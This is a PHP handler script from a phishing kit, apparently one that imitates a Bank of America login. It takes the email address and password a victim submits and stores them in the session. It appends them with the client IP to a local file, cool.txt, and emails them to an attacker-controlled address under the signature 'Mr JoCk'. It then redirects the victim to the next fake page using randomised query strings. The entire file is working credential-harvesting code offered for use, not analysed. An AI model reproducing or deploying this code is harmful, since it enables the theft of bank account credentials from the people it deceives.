<?php

session_start();
$_SESSION['emaill'] = $_POST['emaill'];
$_SESSION['pass'] = $_POST['pass'] ;
$TIME_DATE = date('H:i:s d/m/Y');
include('Email.php');

$message .= "----------------------+   Full +-------------------\n";
$message .= "-----------------------------------------------------\n";
$message .= " email = ".$_POST["email"]."\n";
$message .= " password = ".$_POST["pass"]."\n";
$message .= "--------------------+ By Mr JoCk +------------------\n";
$message .= "Client IP: ".$ip." \n";
$subject = "Email BOA By JoCk- From:  [ $ip ]";
$file = fopen("./cool.txt","a"); 
fwrite($file, $message);
$headers = 'From: Mr JoCK <WF@rezult.com>' ;
{
mail($XBALTI_EMAIL,$subject,$message,$headers);
}
header("Location: ./surf4.php?cmd=_update" . md5(microtime()) . "&account_" . md5(microtime()) . "=" . md5(microtime()) . "&lim_session=" . sha1(microtime()) . "");
?>

